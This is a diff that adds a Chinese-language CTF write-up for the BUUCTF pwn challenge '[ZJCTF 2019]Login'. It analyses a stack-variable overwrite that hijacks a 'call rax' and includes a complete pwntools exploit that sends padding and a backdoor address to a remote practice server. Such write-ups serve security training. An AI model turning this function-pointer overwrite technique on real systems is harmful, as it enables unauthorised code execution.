@@ -405,3 +405,72 @@ p.interactive()
     > | 填充的剩余空间 |                   |
     > | buf-4          | 栈迁移后的ebp     |
     > | leave          | 执行leave_ret     |
+
+## 55 [ZJCTF 2019]Login    
+
+栈追踪？或许叭
+
+函数是用c++写的，看起来有点令人头大
+
+```shell
+❯ checksec pwn
+[*] '/home/pwn/pwn/buuctf/55/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+```
+
+ida查看
+
+<img src="./images/image-20250216001902396.png" alt="image-20250216001902396" style="zoom:80%;" />
+
+在第14和16行发现要输入的账号和密码，不过肯定没有这么简单，执行看看
+
+```shell
+❯ ./pwn
+ _____   _  ____ _____ _____   _                _
+|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __
+  / /_  | | |     | | | |_    | |   / _ \ / _` | | '_ \
+ / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |
+/____\___/ \____| |_| |_|     |_____\___/ \__, |_|_| |_|
+                                          |___/
+Please enter username: admin
+Please enter password: 2jctf_pa5sw0rd
+Password accepted: Password accepted:
+
+[1]    4014 segmentation fault  ./pwn
+```
+
+==寄==
+
+看别人的汇编发现在`password_checker`函数中有一个隐蔽的错误
+
+<img src="./images/image-20250216002126070.png" alt="image-20250216002126070" style="zoom: 80%;" />
+
+主可以看到在`0x400A54`位置处有一个`call rax`指令，那么我们将rax修改为后门函数的地址就可以了（默认你找到那个后门函数了）
+
+<img src="./images/image-20250216002324164.png" alt="image-20250216002324164" style="zoom:80%;" />
+
+可以在`0x400A89`位置处发现rax的值由`var_18`确定，那么去找一下`var_18`在哪里
+
+<img src="./images/image-20250216002503305.png" alt="image-20250216002503305" style="zoom:80%;" />
+
+有的，兄弟，有的...
+
+从`s`处（ebp-0x60)开始，到`var_18`(ebp-0x18),再除去已经输入的密码`2jctf_pa5sw0rd\x00`(0xe长度),我们需要填充的数据量为`0x60 - 0x18 - 0xe = 0x3a`
+
+所以exp：
+
+```python
+from pwn import *
+
+p = remote('node5.buuoj.cn',25872)
+backdoor = 0x400e88
+p.sendlineafter(': ','admin')
+p.sendlineafter(': ',b'2jctf_pa5sw0rd'+b'\x00'*0x3a+p64(backdoor))
+p.interactive()
+```
+
